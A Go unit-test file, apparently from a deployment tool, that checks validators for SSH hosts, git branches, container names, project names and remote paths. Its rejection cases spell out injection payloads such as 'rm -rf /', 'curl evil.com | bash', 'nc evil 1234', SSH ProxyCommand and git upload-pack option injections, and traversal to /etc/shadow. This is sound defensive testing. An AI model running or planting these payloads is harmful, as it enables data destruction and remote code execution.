package reconcile

import (
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestValidateHost(t *testing.T) {
	tests := []struct {
		name    string
		host    string
		wantErr bool
		errMsg  string
	}{
		// Valid hosts
		{"simple hostname", "server", false, ""},
		{"hostname with dots", "server.example.com", false, ""},
		{"user@host", "root@192.168.1.1", false, ""},
		{"user with underscore", "deploy_user@server", false, ""},
		{"user with hyphen", "deploy-user@server", false, ""},
		{"hostname with hyphen", "my-server.local", false, ""},
		{"ip address", "192.168.1.1", false, ""},

		// Invalid: empty
		{"empty host", "", true, "host cannot be empty"},

		// Invalid: starts with dash (SSH option injection)
		{"starts with dash", "-oProxyCommand=evil", true, "cannot start with '-'"},
		{"option injection", "-v", true, "cannot start with '-'"},

		// Invalid: shell metacharacters
		{"semicolon injection", "host;rm -rf /", true, "shell metacharacter"},
		{"pipe injection", "host|cat /etc/passwd", true, "shell metacharacter"},
		{"ampersand injection", "host&echo pwned", true, "shell metacharacter"},
		{"dollar injection", "host$(whoami)", true, "shell metacharacter"},
		{"backtick injection", "host`id`", true, "shell metacharacter"},
		{"parenthesis injection", "host()", true, "shell metacharacter"},
		{"curly brace injection", "host{}", true, "shell metacharacter"},
		{"redirect injection", "host>file", true, "shell metacharacter"},
		{"newline injection", "host\necho pwned", true, "shell metacharacter"},
		{"single quote injection", "host'cat /etc/passwd'", true, "shell metacharacter"},
		{"double quote injection", "host\"test\"", true, "shell metacharacter"},

		// Invalid: bad format
		{"invalid chars", "host@with@two@ats", true, "must match"},
		{"space in host", "host name", true, "must match"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateHost(tt.host)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateBranch(t *testing.T) {
	tests := []struct {
		name    string
		branch  string
		wantErr bool
		errMsg  string
	}{
		// Valid branches
		{"simple branch", "main", false, ""},
		{"feature branch", "feature/new-feature", false, ""},
		{"with dots", "release-1.0.0", false, ""},
		{"with underscore", "my_branch", false, ""},
		{"with numbers", "branch123", false, ""},
		{"complex path", "refs/heads/main", false, ""},
		{"bugfix branch", "bugfix/issue-42", false, ""},

		// Invalid: empty
		{"empty branch", "", true, "branch cannot be empty"},

		// Invalid: starts with dash (git option injection)
		{"starts with dash", "-branch", true, "cannot start with '-'"},
		{"option injection", "--hard", true, "cannot start with '-'"},

		// Invalid: shell metacharacters
		{"semicolon injection", "branch;rm -rf /", true, "shell metacharacter"},
		{"pipe injection", "branch|cat /etc/passwd", true, "shell metacharacter"},
		{"ampersand injection", "branch&echo pwned", true, "shell metacharacter"},
		{"dollar injection", "branch$(whoami)", true, "shell metacharacter"},
		{"backtick injection", "branch`id`", true, "shell metacharacter"},
		{"parenthesis injection", "branch()", true, "shell metacharacter"},
		{"newline injection", "branch\necho pwned", true, "shell metacharacter"},

		// Invalid: bad format
		{"space in branch", "my branch", true, "must match"},
		{"special chars", "branch@name!", true, "must match"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateBranch(tt.branch)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateSignal(t *testing.T) {
	tests := []struct {
		name    string
		signal  string
		wantErr bool
		errMsg  string
	}{
		// Valid signals with SIG prefix
		{"SIGHUP", "SIGHUP", false, ""},
		{"SIGTERM", "SIGTERM", false, ""},
		{"SIGKILL", "SIGKILL", false, ""},
		{"SIGUSR1", "SIGUSR1", false, ""},
		{"SIGUSR2", "SIGUSR2", false, ""},

		// Valid signals without SIG prefix
		{"HUP", "HUP", false, ""},
		{"TERM", "TERM", false, ""},
		{"KILL", "KILL", false, ""},
		{"USR1", "USR1", false, ""},
		{"USR2", "USR2", false, ""},

		// Valid signals lowercase (should normalize)
		{"lowercase sighup", "sighup", false, ""},
		{"lowercase term", "term", false, ""},

		// Invalid: empty
		{"empty signal", "", true, "signal cannot be empty"},

		// Invalid: not in allowlist
		{"invalid signal", "SIGFOO", true, "must be one of"},
		{"numeric signal", "9", true, "must be one of"},
		{"command injection", "SIGHUP;rm", true, "must be one of"},
		{"sigint not allowed", "SIGINT", true, "must be one of"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateSignal(tt.signal)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateContainerName(t *testing.T) {
	tests := []struct {
		name          string
		containerName string
		wantErr       bool
		errMsg        string
	}{
		// Valid container names
		{"simple name", "mycontainer", false, ""},
		{"with hyphen", "my-container", false, ""},
		{"with underscore", "my_container", false, ""},
		{"with dot", "my.container", false, ""},
		{"with numbers", "container123", false, ""},
		{"starts with number", "1container", false, ""},
		{"complex name", "traefik-proxy_v2.0", false, ""},

		// Invalid: empty
		{"empty name", "", true, "container name cannot be empty"},

		// Invalid: starts with dash (docker option injection)
		{"starts with dash", "-container", true, "cannot start with '-'"},
		{"option injection", "--rm", true, "cannot start with '-'"},

		// Invalid: shell metacharacters
		{"semicolon injection", "container;rm -rf /", true, "shell metacharacter"},
		{"pipe injection", "container|cat /etc/passwd", true, "shell metacharacter"},
		{"ampersand injection", "container&echo pwned", true, "shell metacharacter"},
		{"dollar injection", "container$(whoami)", true, "shell metacharacter"},
		{"backtick injection", "container`id`", true, "shell metacharacter"},
		{"parenthesis injection", "container()", true, "shell metacharacter"},
		{"newline injection", "container\necho pwned", true, "shell metacharacter"},

		// Invalid: bad format
		{"starts with dot", ".container", true, "must start with alphanumeric"},
		{"starts with underscore", "_container", true, "must start with alphanumeric"},
		{"space in name", "my container", true, "must start with alphanumeric"},
		{"special chars", "container@name!", true, "must start with alphanumeric"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateContainerName(tt.containerName)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

// TestValidationIntegration tests that validation functions correctly reject
// known attack patterns that could lead to command injection.
func TestValidationIntegration(t *testing.T) {
	t.Run("SSH option injection via host", func(t *testing.T) {
		attacks := []string{
			"-oProxyCommand=bash -c 'rm -rf /'",
			"-o ProxyCommand=evil",
			"-L 8080:localhost:80",
			"-R 8080:localhost:80",
		}
		for _, attack := range attacks {
			err := validateHost(attack)
			require.Error(t, err, "should reject: %s", attack)
		}
	})

	t.Run("git option injection via branch", func(t *testing.T) {
		attacks := []string{
			"--upload-pack=evil",
			"-c credential.helper=evil",
			"--config=evil",
		}
		for _, attack := range attacks {
			err := validateBranch(attack)
			require.Error(t, err, "should reject: %s", attack)
		}
	})

	t.Run("command injection via shell metacharacters", func(t *testing.T) {
		attacks := []string{
			"valid;rm -rf /",
			"valid|cat /etc/passwd",
			"valid&& curl evil.com | bash",
			"valid$(curl evil.com)",
			"valid`curl evil.com`",
		}
		for _, attack := range attacks {
			assert.Error(t, validateHost(attack), "host should reject: %s", attack)
			assert.Error(t, validateBranch(attack), "branch should reject: %s", attack)
			assert.Error(t, validateContainerName(attack), "container should reject: %s", attack)
		}
	})
}

func TestValidateProjectName(t *testing.T) {
	tests := []struct {
		name        string
		projectName string
		wantErr     bool
		errMsg      string
	}{
		// Valid project names
		{"simple", "myproject", false, ""},
		{"with hyphen", "my-project", false, ""},
		{"with underscore", "my_project", false, ""},
		{"with dot", "my.project", false, ""},
		{"with numbers", "project123", false, ""},
		{"starts with digit", "1project", false, ""},
		{"mixed", "bosun-v2.0_prod", false, ""},

		// Invalid: empty
		{"empty", "", true, "cannot be empty"},

		// Invalid: starts with dash (option injection)
		{"starts with dash", "-project", true, "cannot start with '-'"},

		// Shell metacharacter corpus (one test per metachar)
		{"semicolon", "a;touch /tmp/bosun_pwn", true, "shell metacharacter"},
		{"ampersand", "a&& rm -rf /", true, "shell metacharacter"},
		{"pipe", "a | nc evil 1234", true, "shell metacharacter"},
		{"dollar subshell", "a$(touch /tmp/pwn)", true, "shell metacharacter"},
		{"backtick subshell", "a`touch /tmp/pwn`", true, "shell metacharacter"},
		{"open paren", "a(", true, "shell metacharacter"},
		{"close paren", "a)", true, "shell metacharacter"},
		{"open brace", "a{", true, "shell metacharacter"},
		{"close brace", "a}", true, "shell metacharacter"},
		{"less than", "a<file", true, "shell metacharacter"},
		{"greater than", "a>file", true, "shell metacharacter"},
		{"backslash", "a\\b", true, "shell metacharacter"},
		{"newline", "a\nb", true, "shell metacharacter"},
		{"carriage return", "a\rb", true, "shell metacharacter"},
		{"single quote", "a'b'", true, "shell metacharacter"},
		{"double quote", "a\"b\"", true, "shell metacharacter"},

		// Known attack payloads
		{"command injection semicolon", "a;touch /tmp/bosun_pwn", true, "shell metacharacter"},
		{"command injection subshell dollar", "a$(touch /tmp/pwn)", true, "shell metacharacter"},
		{"command injection backtick", "a`touch /tmp/pwn`", true, "shell metacharacter"},
		{"command injection and", "a && rm -rf /", true, "shell metacharacter"},
		{"command injection pipe nc", "a | nc evil 1234", true, "shell metacharacter"},

		// Invalid: bad format
		{"space in name", "my project", true, "invalid project name format"},
		{"starts with dot", ".project", true, "invalid project name format"},
		{"at sign", "project@host", true, "invalid project name format"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateProjectName(tt.projectName)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestValidateRemotePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		// Valid paths
		{"absolute path", "/mnt/appdata", false, ""},
		{"absolute with subdir", "/mnt/user/appdata", false, ""},
		{"relative simple", "appdata/service", false, ""},
		{"with hyphen", "/mnt/app-data", false, ""},
		{"with underscore", "/mnt/app_data", false, ""},
		{"with dot", "/mnt/app.data", false, ""},

		// Invalid: empty
		{"empty", "", true, "cannot be empty"},

		// Invalid: path traversal
		{"path traversal", "/mnt/../etc/passwd", true, "path traversal"},
		{"relative traversal", "../../etc/shadow", true, "path traversal"},
		{"embedded traversal", "/valid/../../../etc/passwd", true, "path traversal"},

		// Shell metacharacter corpus
		{"semicolon", "/mnt;rm -rf /", true, "shell metacharacter"},
		{"ampersand", "/mnt&whoami", true, "shell metacharacter"},
		{"pipe", "/mnt|cat /etc/passwd", true, "shell metacharacter"},
		{"dollar subshell", "/mnt$(id)", true, "shell metacharacter"},
		{"backtick", "/mnt`id`", true, "shell metacharacter"},
		{"single quote", "/mnt'evil'", true, "shell metacharacter"},
		{"double quote", "/mnt\"evil\"", true, "shell metacharacter"},
		{"newline", "/mnt\nid", true, "shell metacharacter"},
		{"backslash", "/mnt\\evil", true, "shell metacharacter"},

		// Invalid: spaces and special chars rejected by regex
		{"space in path", "/mnt/app data", true, "invalid remote path format"},
		{"at sign", "/mnt/@data", true, "invalid remote path format"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRemotePath(tt.path)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errMsg)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

// TestShellMetacharsCorpus verifies that every character in the shellMetachars
// slice is rejected by both ValidateProjectName and ValidateRemotePath.
func TestShellMetacharsCorpus(t *testing.T) {
	for _, char := range shellMetachars {
		char := char // capture
		t.Run("projectName/"+fmt.Sprintf("%q", char), func(t *testing.T) {
			name := "safe" + char + "name"
			err := ValidateProjectName(name)
			require.Error(t, err, "ValidateProjectName should reject metachar %q", char)
		})
		t.Run("remotePath/"+fmt.Sprintf("%q", char), func(t *testing.T) {
			path := "/mnt" + char + "evil"
			err := ValidateRemotePath(path)
			require.Error(t, err, "ValidateRemotePath should reject metachar %q", char)
		})
	}
}
